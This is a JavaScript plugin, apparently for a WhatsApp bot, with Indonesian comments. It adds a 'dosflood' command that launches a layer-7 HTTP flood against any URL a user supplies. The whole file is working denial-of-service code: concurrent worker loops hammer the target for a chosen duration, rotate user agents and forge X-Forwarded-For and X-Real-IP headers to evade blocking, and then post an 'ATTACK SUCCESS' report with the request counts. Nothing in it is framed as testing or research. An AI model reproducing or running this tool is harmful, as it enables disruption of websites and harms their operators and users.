// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  Lolpop MD — Plugin Owner: Dos Flood L7
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import settings from "../../settings.js";
import { request } from "undici";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const UA_LIST = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
];

const pick = (a) => a[Math.floor(Math.random() * a.length)];
const randIp = () =>
  `${1 + Math.floor(Math.random() * 223)}.${Math.floor(Math.random() * 256)}.${Math.floor(
    Math.random() * 256
  )}.${1 + Math.floor(Math.random() * 254)}`;

function renderBar(pct) {
  const total = 5;
  const filled = Math.round((pct / 100) * total);
  return "▰".repeat(filled) + "▱".repeat(total - filled);
}

export default {
  meta: {
    name: "dosflood",
    command: ["dosflood", "dos", "l7flood", "flood7"],
    category: "tools",
    section: "💣 ATTACK",
    description: "Flood layer 7 ke target URL",
    vip: true,
    premiumLimit: 10, 
    owner: false,
    group: false,
    private: false
  },

  async run(sock, m, { args, command }) {
    const url = (args[0] || "").trim();
    const duration = parseInt(args[1], 10) || 30;      // detik
    const concurrency = parseInt(args[2], 10) || 50;   // worker

    if (!url || !/^https?:\/\//i.test(url)) {
      return m.reply(
        `❌ Format salah!\n\n` +
        `*Cara pakai:*\n` +
        `> .${command} <url> [durasi_detik] [concurrency]\n\n` +
        `Contoh:\n` +
        `> .${command} https://target.com 30 80`
      );
    }

    // ── React 💣 sebelum loading ──
    try {
      await sock.sendMessage(m.chat, {
        react: { text: "💣", key: m.key }
      });
    } catch (_) {}

    // ── Placeholder buat animasi edit ──
    const ph = await sock.sendMessage(
      m.chat,
      { text: "> procces" },
      { quoted: m }
    );
    const phKey = ph.key;

    // ── Counter ──
    let sent = 0,
      ok = 0,
      err = 0;
    let running = true;
    const started = Date.now();

    // ── Worker pool ──
    async function worker() {
      while (running) {
        try {
          const res = await request(url, {
            method: pick(["GET", "GET", "GET", "POST", "HEAD"]),
            headers: {
              "user-agent": pick(UA_LIST),
              accept: "*/*",
              "accept-language": "en-US,en;q=0.9",
              "cache-control": "no-cache",
              pragma: "no-cache",
              "x-forwarded-for": randIp(),
              "x-real-ip": randIp(),
              connection: "keep-alive",
              referer: url
            },
            body: Math.random() < 0.2 ? "a=".repeat(64) : undefined
          });
          sent++;
          if (res.statusCode < 500) ok++;
          else err++;
          try {
            await res.body.dump();
          } catch (_) {}
        } catch (_) {
          err++;
        }
      }
    }

    // ── Animasi loading via edit ──
    async function animator() {
      const steps = [0, 15, 20, 69, 89, 100];
      let i = 0;
      while (running) {
        const elapsed = Date.now() - started;
        const pct =
          elapsed >= duration * 1000
            ? 100
            : Math.min(99, Math.floor((elapsed / (duration * 1000)) * 100));
        const shown = pct === 100 ? 100 : steps[Math.min(i, steps.length - 2)] ?? pct;
        const bar = renderBar(shown);
        try {
          await sock.sendMessage(m.chat, {
            text: `> attack  ${bar} ${shown}%`,
            edit: phKey
          });
        } catch (_) {}
        i = Math.min(i + 1, steps.length - 1);
        await sleep(900);
      }
      // penutup 100%
      try {
        await sock.sendMessage(m.chat, {
          text: `> attack  ${renderBar(100)} 100%`,
          edit: phKey
        });
      } catch (_) {}
    }

    // ── Stop timer ──
    const stopTimer = setTimeout(() => {
      running = false;
    }, duration * 1000);

    // ── Jalan bareng ──
    const workers = Array.from({ length: concurrency }, () => worker());
    await Promise.all([...workers, animator()]);
    running = false;
    clearTimeout(stopTimer);

    // ── React ✅ selesai ──
    try {
      await sock.sendMessage(m.chat, {
        react: { text: "✅", key: m.key }
      });
    } catch (_) {}

    // ── Laporan akhir ──
    const status = err === 0 ? "ALL OK" : ok > err ? "OK" : "PARTIAL";
    const report =
      `⌠ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 ✓ ⌡\n` +
      `☇ target url : ${url}\n` +
      `☇ status : ${status}\n` +
      `☇ total send : ${sent} (${ok} ok / ${err} err)\n\n` +
      `_HARAP JEDA SELAMA 10 MENIT!_`;

    const footer = `${settings.botName} v${settings.version}`;

    // ── Button + fallback ──
    try {
      await sock.sendMessage(m.chat, {
        text: report,
        footer,
        interactiveButtons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "CEK TARGET",
              url,
              merchant_url: url
            })
          }
        ]
      });
    } catch (_) {
      // fallback klasik
      try {
        await sock.sendMessage(m.chat, {
          text: report,
          footer,
          templateButtons: [
            { urlButton: { displayText: "CEK TARGET", url } }
          ]
        });
      } catch (__) {
        await sock.sendMessage(m.chat, {
          text: report + `\n\n🌐 ${url}`
        });
      }
    }
  }
};